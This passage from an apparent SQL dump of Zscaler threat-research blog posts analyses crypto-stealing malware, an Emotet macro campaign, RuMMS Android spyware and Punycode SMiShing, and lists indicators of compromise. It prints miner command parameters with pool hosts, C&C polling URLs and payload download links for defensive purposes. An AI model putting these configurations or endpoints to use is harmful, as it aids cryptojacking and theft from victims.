(SDBot fork), is a decade-old botnet known for its worming and spamming capabilities. It used to spread via Skype, but for some time it has been spread using email spam and removable drives.        Fig. 4: Phorpiex spreading through removable drives    It began showing interest in coinminers some time back and has been downloading various coinminers along with other malware on systems infected with Phorpiex. It also downloaded a Monero miner payload with following configuration.    “url\": \"monerohash[.]com:3333\",    \"user\": \"4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQr2cM6dRYBvTiv1U3V\",    \"pass\": \"x\",        Image: Monero mining campaign payout    The Monero mining campaign run by Phorpiex operators is still going on and has so far earned approximately $6,797.52 USD.    Recently, we came across Phorpiex v6.0, which did not contain spamming functionality, but contained clipboard hijacking code for targeting multiple cryptocurrencies.        Fig. 4: PDB strings found in the latest Phorpiex/Trik variant        Fig. 5: Pseudocode for clipboard hijacking    Phorpiex monitors for 14 cryptocurrencies and if the address format for any cryptocurrency is detected, it replaces that with a corresponding address from a hardcoded list.        Fig. 6: List of embedded cryptocurrency addresses    As shown in the screen below, some people unaware of how their coins were transferred to a malware operator’s account, or that they are infected by malware, are commenting on Etherscan (the Etherium block explorer website at http://etherscan.io) requesting a return of their property.        Fig. 7: Victim’s comments on etherscan.io         EngineBox and Xpctra    Some time back, we came across two malware strains targeting Brazilian users. We named them “EngineBox” and “Xpctra” based on class names. The malware contains code from multiple open-source projects, which they use to carry out the malicious activity. They also contain multiple references to characters or objects in Lord of the Rings. The following are open-source projects used by loader and final payload.    The main components of these strains are:      	Remote-access Trojan (RAT)  	Financial data stealing module  	Bot (IRC or TCP)  	AntiAV  	Spamming           Functionality comparison of EngineBox and Xpctra:      	  		  			  			Module  			  			  			EngineBox  			  			  			Xpctra  			  		  		  			  			Persistence  			  			  			Yes  			  			  			Yes  			  		  		  			  			Steal banking data  			  			  			Yes  			  			  			Yes  			  		  		  			  			Steal bitcoin data  			  			  			No  			  			  			Yes  			  		  		  			  			Replace bitcoin address  			  			  			Yes  			  			  			No  			  		  		  			  			Steal email credentials  			  			  			No  			  			  			Yes  			  		  		  			  			RAT  			  			  			Yes  			  			  			Yes  			  		  		  			  			Bot  			  			  			Yes (IRC)  			  			  			Yes (TCP)  			  		  		  			  			Send spam  			  			  			No  			  			  			Yes  			  		  		  			  			Block security software  			  			  			No  			  			  			Yes (12 process names)  			  		  		  			  			Block security websites  			  			  			Yes (3 websites)  			  			  			Yes ( 16 websites)  			  		  	           Complete technical details are beyond the scope of this blog. We will focus only on EngineBox and Xpctra’s cryptocurrency-related activity.    Along with targeting multiple banking sites for traffic interception using Fiddler, the malware targets some websites for keywords related to a bitcoin wallet, address, etc. If a user is submitting any form with a bitcoin address, the malware captures and validates the bitcoin address, and sends it to its C&C server. If some known bitcoin-related website is detected, then it will replace the bitcoin-receiving address with the attacker’s bitcoin address. For example,  “wallet=”, “address=” and \"retirada/form_bitcoin\" are few of the strings monitored by this malware in HTTP requests.        Fig. 8: Code to check and replace bitcoin address in HTTP request    It also steals credentials for digital currency wallet like mercadobitcoin.com, Neteller, Blockchain.info, and PerfectMoney.    \"https://www.mercadobitcoin.com.br/conta/login/\",    \"https://blockchain.info/wallet\",    \"https://member.neteller.com/public/authenticate\",    \"https://perfectmoney.is/user/userlogin.asp\"         Bitcoin address monitor    EngineBox use a clipboard change event handler, which checks whether data copied to a clipboard is a bitcoin address. If a bitcoin address is found on a clipboard, the malware replaces that address with the attacker’s bitcoin address in the hope that the victim will unknowingly transfer bitcoins to the attacker’s address.    The malware sends messages to its C&C server if any bitcoin address is found, and it starts another thread that polls the server every six minutes for bitcoin addresses at “http://log.lapiscolorido.]com/aragorn/admin/bit.php?ACAO=PUSH.”        The “received Bitcoin” address is 12BfckGRRquTvwEJtULhpP2TN1GPez4ntK. The last transaction of this bitcoin address was on 2018-06-25. The attacker is constantly moving money out of this address as soon as it is received. Transactions on this bitcoin address are shown in the screen below:        Fig. 9: Balance of bitcoin address used in malware         Kasidet    Kasidet is multipurpose malware also known as Neutrino, a bot that was first observed being advertised on a hacking forum in December 2013. It was seen downloading coinminers on infected systems starting late 2017. Coinminer details are as follows:    Monero miner:    Parameter:-o stratum+tcp://xmr.pool.minergate.com:45560 -u alexandrjakov@mail.ru -p x    FCN (Fantomcoin) miner:    Parameter: -o stratum+tcp://fcn-xmr.pool.minergate.com:45590 -u alexandrjakov@mail.ru -p x         Timeline on bitcoin price vs. malware family variants        Fig. 10: Timeline of bitcoin price and malware family variants         Conclusion    As more people are getting familiar with and starting to use or invest in cryptocurrencies, the awareness and pervasiveness of cryptocurrencies in everyday life will continue to rise. In spite of their initial resistance to cryptocurrencies, more and more governments are realizing the potential of cryptocurrencies and the underlying blockchain technology in the digital era. They are realizing that they can’t just ban their use—the new era of digital currencies has already begun. As a result, we will see an increase in crypto-malware. The Zscaler ThreatLabZ research team will continue to monitor and analyze these threats with a goal to provide protection against them.         IOC:    Kasidet    Monero Miner MD5: 806779989C6EA355A1ABF4F6C7CB646C    Monero GPU Miner: 88eddf09f8abcd8881737b5b58954099    FCN Miner MD5: 3a18ecb034a227ed0b09a877ebb7cfaa    Phorpiex  MD5: deea904eb9073a36f5cc649559853015, 7f1ddc3894891398f861662d39b6066b  URL : www.eraspire[.]com/wp-content/t7070.exe  MoneorMiner MD5: 3dfa222fed3567b6189762e951d76377    URL:  92.63.197[.]106/mm.exe  C&C:  112.126.94[.]107:5050  123.56.228[.]49:5050  220.181.87[.]80:5050    EngineBox & Xpctra  MD5:   5b0639aab22ed1fdb4913805662078fe  3d9f0fdccc05167d76b8af21cd5985b3  0723683a105cd506e21c9a1d08d06226  661cc13f6a0ca4b14585f772d19dc718  364825dc47eb1688ca325b84dc7d0656    URL:   185.141.165[.]210/gandalf/files/W7.txt  65.181.113[.]87/sshd/aw7.tiff  65.181.113[.]87/sshd/W7.zip  65.181.113[.]87/sshd/dll.dll  65.181.113[.]87/sshd/dll.dll.exe    C&C:  babalu.workscx[.]com  irc.lapiscolorido[.]com  ssh.lapiscolorido[.]com  log.lapiscolorido[.]com  irc.donetuasd[.]com   ssh.donetuasd[.]com   log.donetuasd[.]com   coca.cheddarmcmelt[.]top  fritas.cheddarmcmelt[.]top  ssl.suzukiburgman[.]top  35.166.186[.]98:4782  petr4[.]in/lol/index.php  petr4[.]in/avs/logs/index.php', 'Malware', 'https://www.zscaler.com/blogs/research/cryptominers-and-stealers-malware-edition');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (27, 'Independence Day greeting campaign delivers Emotet', 'Tarun Dewan', 'July 06, 2018', 'Recently, Zscaler\'s research team, ThreatLabZ, came across malicious Microsoft Office documents delivering Emotet malware via attachments using \"Greeting Card\" as the document name. The malware author leveraged the popular 4th of July holiday, the USA\'s Independence Day, to lure users into downloading and opening the malicious documents. We saw over two dozen unique payloads hitting our Cloud Sandbox in the 48-hour span from July 2nd to July 4th earlier this week. The filenames and hashes for these attachments are shown below:      	  		  			  			Filename  			  			  			Hashes  			  		  		  			  			Greeting-Card-07-04-2018.doc  			  			  			88b9cff1d3c253f93c56c1a3a3c78800  			  		  		  			  			Greeting-Card-July-4.doc  			  			  			3fe87f1b847a8a10989342fb9a92e7c9  			  		  		  			  			Greeting-Card.doc  			  			  			223c733af5b6036d855c7c9177116ef4  			  		  		  			  			Greeting-Card-July-4.doc  			  			  			229e78f0da36f6ad099d6fc35f154a5d  			  		  		  			  			Greeting-Card-07-04-2018.doc  			  			  			6c0c7ee1f783a1465d1fcad1b227aa43  			  		  		  			  			Greeting-Card-07042018.doc  			  			  			57fc905430afb5323c68e14f28e02f4c  			  		  		  			  			Greeting-Card-07042018.doc  			  			  			12e13776e95851ebf61e57e0600dfb4f  			  		  	      Fig.1: Filenames of the attachments with the hashes    In attempting to open the attachment, the user sees the following social-engineered message asking the user to enable content, which will execute the malicious macro in the background. Microsoft Office by default disables automatic execution of embedded macros until the user specifically selects \"enable content.\"        Fig. 2: Fake Office message that asks user to enable macros       Macro obfuscation and de-obfuscation    There is only one macro in the document named Sub_Autoopen(). It includes a lot of junk code to throw off security researchers attempting to analyze it.         Fig. 3: Embedded obfuscated macro triggering with AutoOpen      The code links the values stored in the variable and then runs the whole command with wscript.exe.                Fig. 4: PowerShell command being de-obfuscated and executed    In the above snapshot, the code is executing Wscript to download a payload using the PowerShell script. The parameters are stored in “OUzoicLZQ.” The PowerShell script is highly obfuscated making it harder to analyze.     Obfuscation script:         Fig. 5: Obfuscated PowerShell command    In the script, we can see it is using: (GV \'*Mdr*\').nAmE[3,11,2]-jOIN\'\'). This is basically for “iex,” which stands for invoke expression. The Invoke-Expression cmdlet (\"command-let\") evaluates or runs a specified string as a command and returns the results of the expression or command. Using the for loop, it is taking characters from an array one by one as a string and XORing with “1d,” and, finally, making the full string the full command string using the JOIN method.    De-obfuscation of PowerShell parameters:        Fig. 6: De-obfuscated PowerShell command parameters    The code then connects the user\'s machine to a remote server, where it will download the Emotet payload, dropping to the temp directory in Windows:    ‘C:\\Users\\user\\AppData\\Local\\Temp\\<random_integer[1-3].exe’    Emotet payload    Emotet creates a copy of itself in “C:\\windows\\system32\\” with the filename created by appending two strings from a predetermined set of hard-coded strings. The combination of strings is chosen based on “volume serial number” of the infected system’s volume.    Creates Mutex : PEM<random_integer_and_alphabets>    For a detailed technical analysis of the Emotet payload, please check our previous blog here.    Zscaler Cloud Sandbox report for one of the greeting card payloads is shown below:        Fig. 7: Zscaler Cloud Sandbox report    IOCs    Download attachment URLs:    www.dokassessoria[.]com.br/independence-day/  www.xiaoguoyx[.]com/4th-july/  pds[.]org.pl/independence-day-greetings/  www.acqi[.]cl/independence-day-greetings/    Malicious document MD5s:    88b9cff1d3c253f93c56c1a3a3c78800  3fe87f1b847a8a10989342fb9a92e7c9  223c733af5b6036d855c7c9177116ef4  229e78f0da36f6ad099d6fc35f154a5d  6c0c7ee1f783a1465d1fcad1b227aa43  57fc905430afb5323c68e14f28e02f4c  12e13776e95851ebf61e57e0600dfb4f    Emotet domain:    dessertcake[.]com.ua/he4f  ky663[.]com/zzd  hunter-kings[.]com/wp-content/czVbGb  dotlenieni[.]pl/Fk5j  clubvolvoitalia[.]it/r3z6  ecuadoresort[.]com/Oa  beraysenbas[.]com/hs2Jv5Y    Emotet executable MD5s:    27e90f2bc9a214b36a59e4ca0b18e75e  D620a9a598f8848c05f72b025f01289b  Ed0abac215c27665005271cfbf77c027  9295c23c16cb8615e4349830df30cc12  c0ebf36bb0f204bd76cb33e7d6e50678    Emotet C&C    92.27.116.104  24.173.127.246  24.121.176.48  186.71.61.90  45.73.1.90  24.234.175.215  24.119.116.230  121.50.43.110  149.62.173.247  12.182.146.226  24.229.49.37  68.2.97.91  216.21.168.27  46.105.131.69  99.224.5.162  69.17.170.58  199.119.78.9  24.74.74.183  157.7.164.23  178.21.113.145  187.178.17.209  118.244.214.210  187.156.24.43  108.170.54.171  177.99.167.185  203.201.60.206  72.0.255.155  194.88.246.242  80.153.201.243  27.50.89.209  206.210.104.194  222.214.218.192  76.72.225.30  203.45.184.52  70.182.77.184  71.244.60.231  146.185.170.222  46.105.131.87  193.251.43.125  78.47.182.42', 'Malware', 'https://www.zscaler.com/blogs/research/independence-day-greeting-campaign-delivers-emotet-5');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (28, 'RuMMS malware is back…with enhancements', 'Shivang Desai', 'June 05, 2018', 'Recently, the Zscaler ThreatLabZ team came across a nasty piece of malware hosted on a fake MMS website called mmsprivate[.]site. The site lures victims with what seem to be private photos, inviting them to take a closer look. Upon accepting the offer, victims fall prey to a malicious Android Package (APK) that downloads onto their phones. The malware disguises itself as Сooбщениe, which translated to english means Messages, and performs its malicious functionality by exploiting Android AccessibilityService, which assists those with disabilities in using Android devices and apps. It then hides itself in order to spy on its victims.    The variant we are analyzing shows some similar traits, with a few modifications, to malware named RuMMS, which was initially reported by FireEye researchers back in 2016. This new version includes various enhancements, so we have dubbed it RuMMS v2.0.      App Details     App name:  Сooбщениe  Hash: c1f80e88a0470711cac720a66747665e  Package Name: ru.row.glass         Detailed Description     Download and installation     The malware is spreading through the site url:mmsprivate[.]site/feel/, and was most likely shared via SMS or email. As soon as the link is clicked, the spyware lures the victim to click a button that leads to the dropping of the malicious APK. The content hosted on the URL is in Russian. You can view the translation in the screenshot below:            	  		  			  		  		  			Fig 1: Initial URL leading to the APK download  		  	           The APK is from an unknown source and, since Android systems do not allow direct-install, leads the victim via simple clicks to enabling the \"Unknown Sources\" option to install the malicious app. Each step is shown below starting from left to right.            	  		  			  		  		  			Fig 2: Install from Unknown Sources  		  	           Enabling AccessibilityService  Once installation is complete, the app masks itself as a messaging app (see the icon below). Upon first use, the app redirects the victim to enable Android AccessibilityService. Once enabled, the app disappears from the home screen.                 	  		  			  		  		  			Fig 3: Enabling AccessibilityService  		  	           If the victim does not enable AccessibilityService, the spyware will continuously appear on the screen (see the second screen in the above snapshot) to encourage the victim to enable the service.    Once AccessibilityService is enabled, the spyware goes into action to make the SMS app the default messaging app. It does this by using the functionality of AccessibilityService to automatically choose “Yes” when asked to confirm the app as the default messaging choice, as shown in the below screenshot.  Users will not be able to see this message box because the choice is made for them.            	  		  			  		  		  			Fig 4: Accessibility Service in action  		  	           Communication    Our investigation showed that once the initial setup is done, the malware starts sending details to a command-and-control (C&C) server. The C&C details were hardcoded. Requests and responses from the C&C were encoded using Base64. The screenshot below shows the decode values being sent and received:           	  		  			  		  		  			Fig 5: First request  		  	           The above screenshot shows details of a victim\'s device being sent to a C&C. The C&C replied with command \"40\" and the names of apps. We noticed that command \"40\" was used for disabling the apps.            	  		  			  		  		  			Fig 6: Initial response  		  	           In this instance, the list of apps to be disabled contained well-known antivirus (AV) apps, including:       	Trend Micro   	Dr. Web  	AhnLab  	Avira  	Sophos  	McAfee  	F-Secure      The malware makes sure that all of these AVs, if present, remain inoperable. As soon as a victim tries to open one of these apps, the malware abruptly closes it. It behaved similarly with an app from a well-known Russian bank, Sber Bank. The malware did not allow any Sber Bank apps to open.     SMS: Sending and stealing    The spyware waits for commands from the C&C server and accordingly exhibits its functionality. As in the case below, we found that command number \"11\" was used for sending SMS messages to any desired number with the body of the SMS instructed by C&C           	  		  			  		  		  			Fig 7: Response containing SMS command  		  	           Upon further analysis, we also found the spyware to be stealing SMS messages from the victim\'s device. This functionality could also be used to steal bank-related one-time-password codes and other relevant information. The screenshot below shows this functionality in action:      	  		  			  		  		  			Fig 8: Stealing SMS messages  		  	           Stealing Contacts    The malware is also able to steal contacts from the victim\'s device. We believe this functionality is used to further spread the malware with a well-known technique called SMS-Phishing (or SMiShing).        	  		  			  		  		  			Fig 9: The app stealing contacts  		  	           Calling     The malware also has calling functionality. In the example below, the number to be called was sent from the C&C server in the encoded manner seen here.       	  		  			  		  		  			Fig 10: Calling functionality  		  	           One of the more interesting things we noticed was the way the malware was being distributed. Every time we visited the link, we were presented with a new malicious app exhibiting the same behavior explained above but with different app name, different package name, and even signed with a different Android certificate. We also found that apps had different C&C servers with the pattern http://<domain-name>.com/<random-chars>/index.php. We noticed the below mentioned domain names in association with the C&C servers:            	  		  			Sr #  			Domain Name  			# of apps contacted  		  		  			1  			sisirplus[.]com  			172  		  		  			2  			vietusprotus[.]com   			50  		  		  			3  			glowbobget[.]com  			45  		  		  			4  			hellowopung[.]com  			102  		  		  			5  			quostpeopls[.]com  			24  		  		  			6  			bannerincbest[.]com  			102  		  		  			7  			campuphome[.]com  			9  		  		  			8  			wewelowertick[.]com  			3  		  		  			9  			bigslogous[.]com  			25  		  		  			10  			zavannerweb[.]com  			55  		  	           Conclusion    A new and improved RuMMS is back in full force as RuMMS v2.0 with enhancements and updated features. In the last 10 days of May 2018, the Zscaler ThreatlabZ team uncovered 580+ similar apps making the rounds in the wild. It is always advisable to stay clear of unknown links. Do not trust any suspicious-looking URLs received either in SMS messages or emails, and only download apps from official app stores.     Zscaler customers are protected from such types of attacks at multiple security levels.    Below is the sha256 hash list of recent samples found in last week. The complete list of 580+ apps can be found here.           	  		  			2cc08d98b2bc11047791e722c2f0e7639f4c5772cda0fb5ecabec1b55914a3c2  		  		  			6ec7fba253b76d3b8090a98c6e87c662af8bcda1694a617cce7db59feb08e6f1  		  		  			96a8393e583ff1a12df458534790dfd2551861a4fd600f741e36023682d9d9be  		  		  			1092d809488da433c5d5433a4a1efdc2e32445637e44b6dc77b7fa0e4d536c43  		  		  			762c5d1b1b95c46aa6727a49ae27e2b19863d406da2091e50ffe13c79211ffac  		  		  			af6773b1dcec3c3a1d05964ed9d245c2271e96835ffbe3fc543912dc602a64f9  		  		  			cfc50b2e3da760a2369dbb5bf45fc8d3cdc37a2ad020084aafe2acb53d8603d6  		  		  			707456abf552e13ba4ece378d0a7a672bd8fbc22185a478478c81fc7e5c96ce9  		  		  			a8352f93f7c23953a6deeace67205216c1d37d7f8f6207147d7b93cf272fca9c  		  		  			751f1ed896639b62e433fcbce5d87b1baeb7a5a82c3a855d30fa4c4c8dddfd81  		  		  			a1ff7ca12de6cbf36a67aa10ee95202f0c37b8b953f916e9f1780a10042e36af  		  		  			4a429aae275be2e06ce751537deae327ba377e2e96fc040611f910957b64fcf5  		  		  			83728b3d17974df0ac424845668496a2bbf6eaa166e899ef2bf842dae2359bf6  		  		  			be4ceb20c9ddf2ddba90988a41ee68f43f205860d9a66d5ac8da500f55fb9d21  		  		  			09aefb181d949be189a580e5415b74f372d61a13edd86930e6aa0046231813fe  		  		  			b5a7683172d38220c4d179c525b9dd8ffaa28b6b5cb9c1b45bac7a72327b7da6  		  		  			383ddecdcdbe2e43035e34307a026e66f79e0b5556f231684db876b3104f0e10  		  		  			d6f172b04d2e4d1eb7d5e58b16d9768cfe59c32d987ca9b4534e9cf859cce8f4  		  		  			f18f523d581acb3136e85cb7b2a056f88e48f2d1dfe21f003ef3f12269e470e1  		  		  			47e105ef7874e30903d6edadeaa5c2731280663f48c7fb5004cc7668a3ac2a81  		  		  			d3ca7e61067f527f7cefdddabb0b770ae8ad6d38a89b0f0bccbed995893cea19  		  		  			1c66a552c0090f81f7b2ce11c8974bbd2aea75afc1092ad5e8d6f8a1ccf416f3  		  		  			21569d8d302180098231efa76482c5a673f344cba8b4654130fada58aad7e62f  		  		  			f2c1b8bd0777cd69329fe22fec8519d810e41b000b92ee13de5629dcd3e875ad  		  		  			98ab7f612c7a1dc3fd44fbd045a6cf21d8c9240dbad08f847423df5f22d7b460  		  		  			758fbbd8a142933f9c5a9866ea7b7c26789da293c93ec3223f5661f62939325c  		  		  			0b246a1ba24761fb4d6f105d210af9e9c2507b475f13084780a7f9e8145a91a6  		  		  			eb607863d2e6a56a53893d4c6253896f3e7ab229a75ad29b32762f27bbd398e5  		  		  			642be174b9ad9d14b4079472d0a641b9c73f6eb3d8a40152025d438619e22ad5  		  		  			bd800b6cc3ea900aa111c88adcffca2b31f8c47e00928df985d62bf4cc0daf2d  		  		  			6858491a04ba906f912d0baf86b37e8ef42c63c505e0db3ffffdf5b543e0c829  		  		  			2518d9deb54ed0fa373b0b22a16da5b7a8f02502470987aeeba34398e083c15c  		  		  			f0dabdc7f4364e810e1870afccfd6af14f844f494cd9026879dc2b3becdba8a7  		  		  			5e4f663d867ab14c7a2ad6e5f35aa315e34ea0e01c50dbb8d63667c405437e1c  		  		  			389393e8642e61e8f884ae288be53b71aa9ff5846c5760d013e57c6843e14440  		  		  			2dfa3d51b031976f8418d8f7d05f8fa803b937cfc6711f9d4ffeca45ca3db0a5  		  		  			b4dd995909b8f99d2b519d347c27386b0bfa434332eb7b0c7483a10f0d1d864c  		  		  			f260bb6965405aac4a79de75650f184911185c34e27cc43d27c88efca86ab712  		  		  			bf170d05c2ae2738ae298b851390eca2bed6fb6db729e3150d3809179c02bec7  		  		  			e191bc75a21a613232cf5cff2f4874106f3cd64f867b5096b193a7fcf9dc74c4  		  		  			88b1fc39c3e89e790fa7fdba78516ac52b489209e9fb38c39aac416f53fdde90  		  		  			64647593a8cdfba26a39441cdf49216fbb687652f490cbed230ebc2061aa6b17  		  		  			027c3f91df5b5f413c4ce117d4e1a4eb33c050a4be96a0385e8a4cc1c445c027  		  		  			ee996791fcabcc88d1bc082060a9989fdb1b7079c2e66583002443ac43da87ec  		  		  			a97e2e39a29ebd7ace2895621a6cf2f4a53990d55752816957034b916a149a31  		  		  			c170ee01c009f4d1a960f6dca3edd2d96fd4e31fad29b7bac248314947d09d1d  		  		  			b0d4b92653518def16f6b08739cf47ba463a6a18f6c7c85ace7be9d6f4145084  		  		  			7cffccf41385f1c82c5383a68d79999a1ff506b403cbb00879351bb247a09371  		  		  			59746db01df4c33edebf4b4b6cfb44d297cde45f23ec6678ef0f2ca15b40d6e9  		  		  			b2a940600d50d862f539eead80d636b556d32aabc462156fe8b29d44c3337ab8  		  		  			8e839d560f08ae14d5ca457ace9735419e8d5e06f8c30febb48d2997145ff1b6  		  		  			5bbecc8c2eaea918ce06e37fa8fda338861662d682cfa43e26ebca6c1075114d  		  		  			d186eaaf72c80289e755ab20a604e4ff20dc98349dfb56206848a4ec79d9388f  		  		  			cc978d00329bbb2c2bf60055d5762dd7b407f44b8df2a31f0d1e54a0958271d8  		  		  			d507332483bb124158b2b02bf0f3d7b07977bf7fa1c34df5a1b001979a2e2a66  		  		  			65d34b945cccd91ce48eb77458768aba34be86be9372f36162e6d42198416775  		  		  			bce3428913c048d7f8114d07fffacecb7273d65a41e0c7b8bff3f63abb1913b1  		  		  			a801e38fb832b7f4f9713fb4fbb35f4c5de156c5787718d7fdbe636499e99cf0  		  		  			048e3bc98ae1d8ac57eb5e55c5b2cbc6661a77992650a10e35a5d0fbbc1227cf  		  		  			cbb5b11f0e934e8e13c1590c5868dce72f1a364ab32e7ba408f2ad9fa8d5145b  		  		  			d1259c1461d71e238ac9984baf96b94c2c145a820ea44d487b6f2fc4e196ef70  		  		  			09ead1fcde087a14da07d58b8db8bed1b18e08701ee4ee300d2af3dbe1a6bd55  		  		  			a36e780153fb6c26e28ab5cb4c51ebfeb6dd1e04ec6f4489d9ea67c710015b74  		  		  			71567ed7c3c0b14a09b5cbd712fcdc777a6bb5d0685c24cccc82e1d1ac3d5d3f  		  		  			319246f91aff8b444037474ce845cc51785b160a2b650a54cfbe402621598de5  		  		  			c14c22ddb3d492ef6b40afb3918a97a4b9a8def4dfb6dc944bcdb476e347f1a5  		  		  			790654bcb118cf14a6ffcb82a73d18620ab1a993f570d6186f3a1571b6d2b2e8  		  		  			04ae5d0126670a8a1eab95373e39db662c921ee468ea7d842d9f894e3d1270c6  		  		  			f7cb9474374badcc8881bd5c48ff9d0ac3149de053d93abc9a1cad45c319ad04  		  		  			bb58e7eb3aa7f212c4d8a4bab1dbd086b8d5621441f50b774d6550b811978897  		  		  			2202684f0ff5b627baa8473f2068ee3b1d976d7d860f9c188a9178253d356cb3  		  		  			d130b94a85a8ded1f52469b68977f601617bd536df34c279d37674b03119eb9c  		  		  			359f8c5ced61249c52655de6ff263c76878c15be12577a920d667f4dcf52e033  		  		  			b51a6a66778db92878578f3e45cba90fcdb64ca8ece738053b399430bde9e94c  		  		  			0da9e58ce9b435726f691e869e3efa8f331a8fc2c877c0cee48430837685ec0e  		  		  			f2176c17ee41cb242db184db275d782293e1a71b7d19fd160d56872b17c75096  		  		  			c9bfea7a58aa8a3b60198832d891622da61d48ace0d97d42aa5616c76382b828  		  		  			8d7bfebd2a5255b4caeff9b0f4e76c62336cf15bd6a860fc77cdd9f36d01c340  		  		  			d717066af883382082fe4672fbc38cc87b52046207f7570f523225f64abe4a25  		  		  			d14542d7d725a7854433d53fc21447931f54d28858f2847c8db6f19de43d2b81  		  		  			edb2edbed8bedb3ef25e131e5ea6ed415bae66799323761f113a8a86c2b935fa  		  		  			41df2e51a18c37acf0564f54ccd2e06ea62122c29a1d705cf1e2a4c31338a2f1  		  		  			6e3b96097a635992b10bc51ff5cd72d0cf5b09aaceeeafd3b3ca84d744706ce0  		  		  			565c9f86c8c4692a1ca018dd0b0b9cf91c54bdb320172214efa4abac2954e075  		  		  			2f9137c1c1e31a7e58a6ad469bd7c268e3a5cd5582e6f930944580a8b1ff827a  		  		  			d1df4dbc7333e4ec1948a0ea180227ed9439aabb78e49bd30d41c86ed901bda1  		  		  			c28ce42efe922a393eedd3b398dd8a6465d08e40c9dddcf170e6eae7d349c196  		  		  			1945682074a418ca389dbc5e69660c7bc0a236fcf90bb8f90c7aa5e03a029d03  		  		  			3d344839de28dcbd9101059d2c1dd66aa14e1aceb68f528177f9fe6cd1051419  		  		  			79ac737775f6e568bfc62b4e1bde90c615e1e9d41604a4f68d889a7352b5a359  		  		  			51ee98b8e02cf3a81a85fd98c8ff9dded3e1b22abee12b308abd2f3aedfda6d7  		  		  			b0bd2ce89516c6e83a0cffd10db0bb371e84de902c7e91be342353bcae147e90  		  		  			94536a9c413b0577f7a81bd6a782e308d40d2f3563f3b6b25f295ae256c074f0  		  		  			600b931a3106c63dc29324aa40dbc75c17ccac0ddbbf44c4c657682dadf9c3d5  		  		  			0c38da53878c2cbf18edbbd080d8f4b3f9973c16244a2f80c3c74c415fcb5694  		  		  			af9d21489a18c551a2eaf4f4b7917539bab44547b38f2f0a7348e2b645fcca8e  		  		  			85f4189eb0f0b6ce91e4d7f93e1e6bec98c4b27950c2b86a5e8f8e05b0e69aac  		  		  			9ff6093319e604690b114f853df4c708e214e65407962ac37299490d5202023e  		  		  			4dfc360fdb55e74f7108daefb7e5becc6790510854bba92e83e1eddc2f16e86b  		  		  			8089f7ea0c96dc24457d9643097a9632c94f9a26bdf8fc6523a5aad555cc4513  		  		  			60231f05a17ca19d8a51c5450cebf7bb1a1bc2464cb88a2530bd933c88f1420c  		  		  			614fcccaf4f988743897200cf0e4330f8878f64ecb395f322b7174f89c08522e  		  		  			a6649912c00dc0f501aeabad050620101ab31ce9088201fe6cf065988b269fe3  		  		  			d5600a87602f0b268dd04436676229ba146dd01571c19678fb6214826101ce11  		  		  			998b7c089ac7441697284bc09024acfcc3e0ea835549e2d9d926f24595ee2f42  		  		  			1661346435dbd53231d06ff769bfe58020bdb124208dc7b67b5fae1f3059342a  		  		  			3ae5dc40e3d4a575762da2d053f38ac82fb2e90fe3beb5292267f85d07b3044b  		  		  			01e1d9835d4447987c9758c18a02b3348b7feb5fef6be284081d71760786e217  		  		  			e41636b8f0972afd36d4f3764775d7f5c861147d770ea9a6ea5d723033ba4ad3  		  		  			51b97227a6c0866af7a01a7dde873626506f724dad2d555cfba0d5c79b8c9d00  		  		  			ed2007c3b031391c1ff9117e3f166ebf2b34a4dd3045ca1f4de4251bad88e5a2  		  		  			e2f6a49245ce98bad73877cc9b5ba71c141c6cd6f16d2147b800744d485d513f  		  		  			72d1b44ca07b64f608cf5ea4ae28a0b501ad646e071cfea0782186458efe9326', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/rumms-malware-back-enhancements');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (29, 'SMiShing with Punycode', 'Rohit Hegde', 'May 31, 2018', 'Cybercriminals keep coming up with new ways to steal and profit from personal user data. Because mobile devices are so prevalent, and so capable, they are becoming the targets of a variety of cyberattacks that were previously limited to computers.    One such attack technique is SMS phishing—SMiShing—in which attacks are delivered via text messages. With SMiShing, mobile users receive links to phishing websites through SMS or chat applications, with text messages luring users to click on links and enter their personal information.    Zscaler ThreatlabZ is seeing more of these SMiShing attacks use “Punycode” to make phishing URLs look like legitimate website URLs. This technique is called a homograph attack. The attacker tries to deceive users by replacing one or more characters in the URL with similar-looking characters from another character script.     The following displays hits that we have seen over last three months for phishing activity on mobile devices targeted with Punycode URLs.        Figure 1: Hits seen for SMiShing activity targeting mobile devices with Punycode URLs from March 1 to May 28, 2018.    Let’s look at a recent example that shows a WhatsApp message pretending to be a link to a Jet Airways offer of free air tickets. The link is designed to look like the actual jetairways.com website, but it is using a homograph attack, in which look-alike characters are used to trick the victims.        Figure 2: WhatsApp message on a group pretending to be a link for free tickets.    If you look closely at the character “i” in the URL domain label, you can see that it is a homograph from the Latin character set. More precisely, it is a Unicode Character “Latin small letter dotless I” (U+0131) that replaces the letter “i” in “airways.”        Figure 3: Decoding the homograph domain label.    If the user clicks this link on an iPhone, it opens the Safari web browser and tries to load the phishing website. Notice that the URL looks like jetairways.com; it is difficult to detect that it is not the true site.        Figure 4: Safari Browser on iPhone showing URL in original IDN (Internationalized Domain Name) format.    Not all browsers treat IDN URLs equally, in the image below we see that Google Chrome on an Android phone shows the user the URL in Punycode format.        Figure 5: Google Chrome browser on an Andorid phone showing the URL in Punycode instead of IDN format.    The Web browsers decide whether to display the IDN or Punycode format based on conditions like the presence of certain characters which can spoof the separators like \".\" or \"/\", determining whether all characters come from same language, if characters belong to allowable combinations or by checking if the domain belongs to whitelisted TLDs. The algorithm for this is detailed here. Google Chrome has also adopted a similar set of rules as followed by Mozilla Firefox as detailed here. Browsers can make these decisions based on restriction levels as classified here.    The different behavior to IDN domain labels by common web browsers is seen below.        Figure 6: Different behavior seen for IDN domains on common browsers.     Coming back to our current example, if we check the domain history for this domain on Domaintools it shows that the domain was newly registered within the last two weeks.        Figure 7: Domain registration information.    The full cycle of this phishing attack can be seen in the screenshot below,        Figure 8: Phishing cycle showing a screenshot of phishing webpage.     We can see that after being served the phishing page, the victim is redirected to another domain, newuewfarben[.]com, which can be used to serve malware. At the time of testing, this URL was inactive.    Conclusion:    SMiShing has been on a rise in year 2018 and the addition of homograph technique will continue to make it more effective against unsuspecting mobile users. Web browsers have implemented protections against homograph attacks, but because of the legitimate use of Punycode characters, it becomes very difficult for the developers to implement a foolproof fix. Attackers leverage 